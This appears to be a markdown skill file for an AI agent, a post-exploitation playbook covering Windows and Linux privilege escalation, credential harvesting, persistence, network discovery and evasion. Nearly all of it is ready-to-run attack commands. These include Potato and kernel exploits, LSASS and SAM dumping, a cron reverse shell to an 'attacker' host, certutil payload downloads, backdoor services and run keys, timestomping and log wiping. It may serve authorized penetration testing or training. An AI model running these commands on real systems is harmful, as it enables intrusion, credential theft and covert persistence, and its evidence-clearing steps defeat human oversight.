---
name: post_exploitation
description: Learn privilege escalation (Windows/Linux), persistence mechanisms, credential harvesting, and internal discovery after gaining initial access. Covers Potato attacks, kernel exploits, LSASS dumping, and living-off-the-land evasion.
---
# Post-Exploitation

## When to Use This Skill

- After gaining initial access to a system (shell, meterpreter, RDP, SSH)
- Escalating from low-privilege user to administrator/root
- Establishing persistence for long-term access
- Harvesting credentials for lateral movement
- Gathering intelligence about internal network
- Preparing for pivot to other systems

---

## Concepts

### Post-Exploitation Lifecycle

1. **Situational awareness** — Understand context: user, privileges, network position
2. **Privilege escalation** — Gain higher privileges (SYSTEM/root)
3. **Credential harvesting** — Extract passwords, hashes, tokens, keys
4. **Persistence** — Establish reliable re-entry mechanisms
5. **Internal discovery** — Map network, identify high-value targets
6. **Lateral movement** — Use harvested credentials to access other systems

### Operational Security Priorities

| Priority | Consideration |
|----------|---------------|
| Process stability | Avoid crashing target; migrate from unstable processes |
| Artifact minimization | Prefer memory-only operations; avoid disk writes |
| Detection evasion | Use built-in tools (LOLBins); blend with normal activity |
| Evidence management | Know what artifacts you create; clean when authorized |

---

## Situational Awareness

### Meterpreter Commands

```
meterpreter > sysinfo              # OS, architecture, hostname
meterpreter > getuid               # Current user context
meterpreter > getpid               # Current process ID
meterpreter > getprivs             # Available privileges
meterpreter > ps                   # Process list (find migration targets)
meterpreter > ipconfig             # Network configuration
meterpreter > route                # Routing table
meterpreter > netstat              # Active connections
meterpreter > arp                  # ARP cache
```

### Metasploit Post Modules

```
msf6 > use post/multi/gather/env
msf6 > use post/windows/gather/enum_logged_on_users
msf6 > use post/windows/gather/enum_applications
msf6 > use post/linux/gather/enum_configs
msf6 > use post/linux/gather/enum_network
```

### Manual Windows Enumeration

```cmd
whoami /all                         # User, groups, privileges
hostname                            # System name
systeminfo                          # OS version, hotfixes, arch
net users                           # Local users
net localgroup administrators       # Admin group members
net user <username>                 # User details
ipconfig /all                       # Network config
netstat -ano                        # Connections with PIDs
tasklist /v                         # Running processes
wmic product get name,version       # Installed software
```

### Manual Linux Enumeration

```bash
id                                  # User, groups
uname -a                            # Kernel version
cat /etc/os-release                 # Distribution
cat /etc/passwd                     # Users
cat /etc/group                      # Groups
sudo -l                             # Sudo permissions
env                                 # Environment variables
ip a                                # Network interfaces
ss -tulpn                           # Listening ports
ps auxf                             # Process tree
dpkg -l | head -20                  # Installed packages (Debian)
```

---

## Privilege Escalation — Windows

### Enumeration Tools

**WinPEAS** (comprehensive, color-coded output):
```cmd
winpeas.exe quiet                   # Reduced output
winpeas.exe cmd searchfast          # Fast mode, cmd format
winpeas.exe log                     # Save to file
```

**Metasploit Local Exploit Suggester**:
```
meterpreter > run post/multi/recon/local_exploit_suggester
```

**PowerUp** (PowerShell):
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

### Token Manipulation (Potato Attacks)

Abuse **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege** (common in service accounts like IIS, MSSQL).

**Check for privileges**:
```cmd
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
```

**GodPotato** (Windows 2012-2022):
```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\path\to\reverse_shell.exe"
```

**PrintSpoofer** (Windows 10/Server 2016-2019, requires Print Spooler):
```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\path\to\shell.exe"
```

**JuicyPotato** (Windows 7-10, Server 2008-2016):
```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
# Use different CLSID per Windows version
```

**Metasploit Potato modules**:
```
msf6 > use exploit/windows/local/ms16_075_reflection_juicy
msf6 > use exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
```

### UAC Bypass

```
msf6 > use exploit/windows/local/bypassuac_fodhelper
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > use exploit/windows/local/bypassuac_silentcleanup
msf6 > set SESSION 1
msf6 > exploit
```

### Service Exploitation

**Unquoted Service Paths**:
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# Place executable in unquoted path space
```

**Weak Service Permissions**:
```cmd
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Users" *
# Look for SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS
```

**Metasploit exploitation**:
```
msf6 > use exploit/windows/local/service_permissions
msf6 > use exploit/windows/local/trusted_service_path
```

### AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must return 0x1
```

**Exploitation**:
```
msf6 > use exploit/windows/local/always_install_elevated
msf6 > set SESSION 1
msf6 > exploit
```

---

## Privilege Escalation — Linux

### Enumeration Tools

**LinPEAS** (comprehensive):
```bash
./linpeas.sh -a                     # All checks
./linpeas.sh -s                     # Superfast (less checks)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Metasploit**:
```
meterpreter > run post/multi/recon/local_exploit_suggester
msf6 > use post/linux/gather/enum_configs
msf6 > use post/linux/gather/enum_system
```

### Kernel Exploits

**DirtyPipe (CVE-2022-0847)** — Kernel 5.8 - 5.16.11:
```bash
./dirtypipe /etc/passwd 1 $'toor:$1$toor$...:0:0::/root:/bin/bash\n'
su toor
```

**PwnKit (CVE-2021-4034)** — Polkit pkexec:
```bash
./PwnKit                            # Instant root shell
```

**Metasploit kernel exploits**:
```
msf6 > use exploit/linux/local/cve_2022_0847_dirtypipe
msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
msf6 > set SESSION 1
msf6 > exploit
```

### SUID/SGID Abuse

```bash
find / -perm -4000 2>/dev/null      # SUID binaries
find / -perm -2000 2>/dev/null      # SGID binaries
```

**GTFOBins reference** (gtfobins.github.io):
```bash
# Example: find with SUID
find . -exec /bin/sh -p \; -quit

# Example: python with SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Sudo Abuse

```bash
sudo -l                             # List sudo permissions
```

**Common exploitable patterns**:
```bash
# LD_PRELOAD (if env_keep+=LD_PRELOAD)
echo 'void _init() { setuid(0); system("/bin/bash"); }' > /tmp/shell.c
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>

# Edit/view commands (vim, less, nano)
sudo vim -c ':!sh'
sudo less /etc/passwd  # then type !sh

# Wildcard injection
sudo tar cf /dev/null * --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### Capabilities

```bash
getcap -r / 2>/dev/null
```

**Exploitable capabilities**:
```bash
# cap_setuid+ep on python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_override (read any file)
# cap_net_raw (network sniffing)
```

### Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Find writable scripts run by root
find /etc/cron* -type f -writable 2>/dev/null
```

### Container Escape

**Check if in container**:
```bash
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv
hostname  # Random string indicates container
```

**Docker socket escape**:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Privileged container escape**:
```bash
# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

**Capabilities abuse (SYS_ADMIN)**:
```bash
# Check capabilities
capsh --print
# Exploit with mount namespace
```

---

## Credential Harvesting — Windows

### Meterpreter/Kiwi

**Load Kiwi extension**:
```
meterpreter > load kiwi
meterpreter > creds_all             # All credential types
meterpreter > creds_msv             # NTLM hashes
meterpreter > creds_wdigest         # Cleartext (pre-Win8)
meterpreter > creds_kerberos        # Kerberos tickets
meterpreter > lsa_dump_sam          # SAM database
meterpreter > lsa_dump_secrets      # LSA secrets
meterpreter > dcsync_ntlm DOMAIN\\krbtgt  # DCSync
```

### Hashdump

```
meterpreter > hashdump              # SAM hashes
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/windows/gather/smart_hashdump
```

### LSASS Dumping (with EDR Evasion)

**Metasploit**:
```
meterpreter > run post/windows/gather/credentials/credential_collector
```

**Living off the land** (less detected):
```cmd
# comsvcs.dll method
tasklist /FI "IMAGENAME eq lsass.exe"  # Get PID
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full

# Task Manager (requires GUI)
Right-click lsass.exe > Create dump file
```

**Offline extraction with pypykatz**:
```bash
pypykatz lsa minidump lsass.dmp
```

### SAM/SYSTEM Extraction

```
meterpreter > run post/windows/gather/hashdump
```

**Manual extraction (with admin)**:
```cmd
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save
```

**Extract hashes with secretsdump**:
```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

### Browser Credentials

```
msf6 > use post/multi/gather/firefox_creds
msf6 > use post/windows/gather/enum_chrome
msf6 > use post/windows/gather/enum_browsers
```

**LaZagne** (all applications):
```cmd
lazagne.exe all
```

### Other Windows Credentials

```
msf6 > use post/windows/gather/credentials/windows_autologin
msf6 > use post/windows/gather/credentials/gpp
msf6 > use post/windows/gather/credentials/vnc
msf6 > use post/windows/wlan/wlan_profile
```

---

## Credential Harvesting — Linux

### Password Files

```bash
cat /etc/shadow                     # If readable (misconfigured)
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt
```

### SSH Keys

```
msf6 > use post/multi/gather/ssh_creds
```

```bash
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts              # Other hosts this user connects to
```

### Configuration Files

```bash
# Database credentials
grep -r "password" /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history
```

### Memory Extraction

```bash
# Dump process memory (requires gdb or gcore)
gcore -o /tmp/memdump $(pgrep sshd)
strings /tmp/memdump.* | grep -i password
```

### Metasploit Post Modules

```
msf6 > use post/linux/gather/hashdump
msf6 > use post/multi/gather/ssh_creds
msf6 > use post/linux/gather/enum_configs
```

---

## Persistence

### Windows Persistence

**Registry Run Keys**:
```
msf6 > use exploit/windows/local/persistence
msf6 > set STARTUP REGISTRY
msf6 > set SESSION 1
msf6 > exploit
```

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\payload.exe"
```

**Scheduled Tasks**:
```
msf6 > use exploit/windows/local/persistence_service
```

```cmd
schtasks /create /tn "Update" /tr "C:\path\to\payload.exe" /sc onlogon /ru SYSTEM
```

**WMI Event Subscription**:
```
msf6 > use exploit/windows/local/wmi_persistence
msf6 > set CALLBACK_INTERVAL 300
msf6 > set SESSION 1
msf6 > exploit
```

**DLL Hijacking** (place in application search path):
```
meterpreter > upload /path/to/malicious.dll C:\Program Files\VulnerableApp\missing.dll
```

### Linux Persistence

**SSH Keys**:
```
msf6 > use post/linux/manage/sshkey_persistence
msf6 > set SESSION 1
msf6 > run
```

```bash
echo "attacker_pub_key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**Cron Jobs**:
```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" | crontab -
```

**Systemd Service**:
```bash
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/path/to/payload
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
```

**Shell Profile**:
```bash
echo 'nohup /path/to/payload &' >> ~/.bashrc
```

---

## Internal Discovery

### Network Enumeration

```
meterpreter > arp                   # ARP cache (local network hosts)
meterpreter > route                 # Routing table (other networks)
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
```

### Active Directory Discovery

```
meterpreter > run post/windows/gather/enum_domain
meterpreter > run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"
meterpreter > run post/windows/gather/enum_shares
meterpreter > run post/windows/gather/enum_domain_tokens
```

### File System Analysis

```
meterpreter > search -f *.txt -d C:\Users
meterpreter > search -f password* -d /
meterpreter > search -f *.config -d C:\inetpub
```

```cmd
dir /s /b C:\Users\*password*
findstr /si password *.txt *.xml *.ini *.config
```

---

## Evasion Techniques

### Process Migration

```
meterpreter > ps                    # List processes
meterpreter > migrate <PID>         # Migrate to stable process
# Good targets: explorer.exe, svchost.exe, notepad.exe
```

### Living Off the Land (LOLBins)

Use built-in Windows binaries to avoid detection:

| Binary | Capability |
|--------|------------|
| `certutil` | Download files, encode/decode |
| `bitsadmin` | Download files in background |
| `mshta` | Execute HTA files |
| `rundll32` | Execute DLLs |
| `regsvr32` | Execute COM scriptlets |
| `powershell` | General execution |

**Download with certutil**:
```cmd
certutil -urlcache -split -f http://attacker/payload.exe C:\temp\payload.exe
```

### Memory-Only Operations

```
meterpreter > execute -H -i -c -m -d calc.exe -f /path/to/payload.exe
# -H hidden, -i interactive, -c channelized, -m in-memory
```

### Timestomping

```
meterpreter > timestomp C:\payload.exe -m "01/01/2020 12:00:00"
meterpreter > timestomp C:\payload.exe -b  # Blank timestamps
```

### Log Manipulation

**Windows**:
```
meterpreter > clearev               # Clear event logs (noisy!)
```

**Linux**:
```bash
echo "" > /var/log/auth.log         # Clear auth log
history -c                          # Clear bash history
unset HISTFILE                      # Disable history logging
```

**Note**: Log clearing is highly detectable. Prefer not creating artifacts in the first place.

---

## Workflows

### Windows Privilege Escalation Workflow

1. **Situational awareness**:
   ```
   meterpreter > sysinfo
   meterpreter > getuid
   meterpreter > getprivs
   ```

2. **Automated enumeration**:
   ```
   meterpreter > run post/multi/recon/local_exploit_suggester
   ```

3. **Check for quick wins**:
   - SeImpersonatePrivilege → Potato attacks
   - AlwaysInstallElevated → MSI payload
   - Unquoted service paths
   - Weak service permissions

4. **Exploit**:
   ```
   msf6 > use exploit/windows/local/<suggested_module>
   msf6 > set SESSION 1
   msf6 > exploit
   ```

5. **Verify escalation**:
   ```
   meterpreter > getuid
   # Should show: NT AUTHORITY\SYSTEM
   ```

### Linux Privilege Escalation Workflow

1. **Check sudo permissions**:
   ```bash
   sudo -l
   ```

2. **Run LinPEAS**:
   ```bash
   ./linpeas.sh | tee linpeas_output.txt
   ```

3. **Check kernel version for exploits**:
   ```bash
   uname -r
   # Search for kernel exploits (DirtyPipe, PwnKit)
   ```

4. **Look for SUID binaries**:
   ```bash
   find / -perm -4000 2>/dev/null
   # Check GTFOBins for exploitation
   ```

5. **Exploit and verify**:
   ```bash
   id  # Should show uid=0(root)
   ```

### Credential Harvesting Workflow

1. **Escalate to SYSTEM/root first**

2. **Windows credential collection**:
   ```
   meterpreter > load kiwi
   meterpreter > creds_all
   meterpreter > lsa_dump_sam
   meterpreter > lsa_dump_secrets
   ```

3. **Linux credential collection**:
   ```
   meterpreter > run post/linux/gather/hashdump
   meterpreter > run post/multi/gather/ssh_creds
   ```

4. **Search for additional credentials**:
   ```
   meterpreter > search -f *password* -d /
   meterpreter > search -f *.config -d C:\
   ```

5. **Crack hashes offline**:
   ```bash
   hashcat -m 1000 ntlm_hashes.txt rockyou.txt  # NTLM
   hashcat -m 1800 linux_hashes.txt rockyou.txt  # Linux SHA-512
   ```

### Persistence Workflow

1. **Choose persistence method** based on access level and stealth requirements

2. **Deploy persistence**:
   ```
   msf6 > use exploit/windows/local/persistence
   msf6 > set STARTUP REGISTRY
   msf6 > set SESSION 1
   msf6 > exploit
   ```

3. **Test persistence**:
   - Reboot system (if possible)
   - Verify callback

4. **Document** persistence mechanism for later removal
